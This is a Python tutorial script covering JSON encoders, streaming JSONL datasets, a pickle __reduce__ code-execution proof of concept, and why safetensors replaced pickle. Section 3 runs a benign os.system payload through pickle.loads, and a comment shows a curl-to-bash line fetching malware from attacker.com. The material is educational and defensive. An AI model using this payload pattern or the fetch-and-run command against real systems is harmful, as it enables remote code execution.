"""
===============================================================================
Day 18: Module 03 - Serialization: JSON, JSONL & Pickle Vulnerabilities
===============================================================================
Author: Sapna Yadav (@Sapnayadav1608)
Topic: Modern Data Interchange, JSON Lines (JSONL) & Dangerous Serialization
Architecture: Safe Model Weight Distribution (Pickle vs Safetensors)
===============================================================================

In distributed AI systems, serialization—translating in-memory Python objects
into portable byte sequences or text—is everywhere:
  - API payloads between FastAPI and frontends (JSON).
  - LLM fine-tuning datasets with millions of training pairs (JSONL).
  - Model weights, embeddings, and tokenizer vocabularies.

However, choosing the wrong serialization format causes catastrophic bugs:
  1. Standard JSON crashes on sets, datetime, UUID, and tensors.
  2. Loading a 10GB JSON array (`[...]`) crashes Python with Out-Of-Memory (OOM).
  3. Deserializing untrusted `pickle` files allows hackers to achieve Remote
     Code Execution (RCE), executing arbitrary root commands on your server!

This module explores:
  1. Custom JSON Encoders & Decoders (`json.JSONEncoder`, `default` handlers).
  2. The JSON Lines (JSONL) Protocol: Streamable, $O(1)$ RAM fine-tuning data.
  3. The Deadly Pickle `__reduce__` Exploit: Live proof-of-concept of arbitrary RCE.
  4. Why AI moved to `safetensors`: Zero-copy, non-executable, memory-mapped tensors.
"""

from __future__ import annotations
import dataclasses
import json
import os
import pickle
import shutil
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Generator, List, Optional
from uuid import UUID, uuid4


# ============================================================================
# SECTION 1: CUSTOM JSON ENCODERS FOR COMPLEX AI DATA
# ============================================================================
print("=" * 75)
print("SECTION 1: CUSTOM JSON ENCODERS (datetime, UUID, dataclass, sets)")
print("=" * 75)

@dataclasses.dataclass
class ModelExecutionPayload:
    request_id: UUID
    model_name: str
    temperature: float
    tags: set[str]
    created_at: datetime


class EnterpriseAIJSONEncoder(json.JSONEncoder):
    """
    Serializes types that standard JSON natively rejects:
      - UUID -> str
      - datetime -> ISO 8601 string
      - set -> sorted list
      - dataclasses -> dictionary
    """
    def default(self, obj: Any) -> Any:
        if isinstance(obj, UUID):
            return str(obj)
        elif isinstance(obj, datetime):
            return obj.isoformat()
        elif isinstance(obj, set):
            return sorted(list(obj))
        elif dataclasses.is_dataclass(obj):
            return dataclasses.asdict(obj)
        return super().default(obj)


sample_payload = ModelExecutionPayload(
    request_id=uuid4(),
    model_name="gemini-1.5-flash",
    temperature=0.7,
    tags={"rag", "finance", "q3_audit"},
    created_at=datetime.now(timezone.utc)
)

serialized_json = json.dumps(sample_payload, cls=EnterpriseAIJSONEncoder, indent=2)
print("Serialized Enterprise Payload:")
print(serialized_json)


# ============================================================================
# SECTION 2: THE JSON LINES (JSONL) PROTOCOL FOR LLM DATASETS
# ============================================================================
print("\n" + "=" * 75)
print("SECTION 2: JSON LINES (JSONL) — THE FORMAT FOR 100GB LLM DATASETS")
print("=" * 75)

# Why standard JSON fails for big data:
# [ {item1}, {item2}, ... {itemN} ] requires loading the WHOLE array into RAM.
# JSONL format: Exactly one valid JSON object per line, separated by '\n'.

def stream_jsonl(filepath: Path | str) -> Generator[Dict[str, Any], None, None]:
    """Yields parsed JSON records one by one with O(1) memory footprint."""
    with open(filepath, "r", encoding="utf-8") as f:
        for line_num, line in enumerate(f, start=1):
            line_str = line.strip()
            if not line_str:
                continue
            try:
                yield json.loads(line_str)
            except json.JSONDecodeError as err:
                raise ValueError(f"Corrupt JSON on line {line_num}: {err}") from err


temp_dir = Path(tempfile.mkdtemp(prefix="jsonl_demo_"))
try:
    dataset_path = temp_dir / "fine_tuning_train.jsonl"
    training_data = [
        {"messages": [{"role": "user", "content": "Hello AI"}, {"role": "assistant", "content": "Greetings!"}]},
        {"messages": [{"role": "user", "content": "Explain JSONL"}, {"role": "assistant", "content": "One JSON per line"}]},
        {"messages": [{"role": "user", "content": "What is Python?"}, {"role": "assistant", "content": "A language"}]},
    ]

    # Write JSONL
    with open(dataset_path, "w", encoding="utf-8") as f:
        for entry in training_data:
            f.write(json.dumps(entry) + "\n")

    # Read JSONL via streaming generator
    print(f"Streaming records from {dataset_path.name}:")
    for i, item in enumerate(stream_jsonl(dataset_path), 1):
        print(f"  Record #{i}: {item['messages'][0]['content']} -> {item['messages'][1]['content']}")

finally:
    shutil.rmtree(temp_dir, ignore_errors=True)


# ============================================================================
# SECTION 3: THE DEADLY PICKLE REMOTE CODE EXECUTION (RCE) EXPLOIT
# ============================================================================
print("\n" + "=" * 75)
print("SECTION 3: THE PICKLE DANGER & THE __reduce__ EXPLOIT (PROOF-OF-CONCEPT)")
print("=" * 75)

class MaliciousExploit:
    """
    Demonstrates the fundamental security vulnerability of Python's `pickle`.
    When pickle deserializes an object, it invokes `__reduce__()`.
    `__reduce__()` returns a callable and arguments, which pickle executes automatically!
    """
    def __reduce__(self):
        # In a real attack, this could be: os.system("curl -s http://attacker.com/malware | bash")
        # Here, we execute a benign echo to prove execution:
        cmd = "echo [SECURITY ALERT] Arbitrary command executed during pickle.loads()!"
        return (os.system, (cmd,))


print("Attacker: Crafting malicious pickled payload...")
exploit_payload = pickle.dumps(MaliciousExploit())

print(f"Payload size: {len(exploit_payload)} bytes. Looks like ordinary binary data.")

print("Victim: Deserializing untrusted file with pickle.loads()...")
print("-" * 50)
# THIS RUNS os.system AUTOMATICALLY:
_ = pickle.loads(exploit_payload)
print("-" * 50)
print("CRITICAL LESSON: NEVER use pickle.loads() on untrusted user inputs or network data!")


# ============================================================================
# SECTION 4: WHY AI ADOPTED SAFETENSORS
# ============================================================================
print("\n" + "=" * 75)
print("SECTION 4: WHY AI MOVED FROM PICKLE (.pt / .bin) TO SAFETENSORS")
print("=" * 75)

safetensors_comparison = """
+-----------------------------------+-----------------------------------+
| Python Pickle (.pt, .bin, .pkl)   | Safetensors (.safetensors)        |
+-----------------------------------+-----------------------------------+
| ❌ Arbitrary code execution (RCE)  | ✅ 100% Non-executable data       |
| ❌ Python-only proprietary format | ✅ Language-agnostic header + bytes|
| ❌ Slow Python object hydration   | ✅ Direct Zero-Copy memory map    |
| ❌ Vulnerable on Hugging Face     | ✅ Industry standard on HF Hub    |
+-----------------------------------+-----------------------------------+
"""
print(safetensors_comparison)

print("Module 03 Complete: Safe Serialization & JSONL Mastery Achieved!")
print("=" * 75)
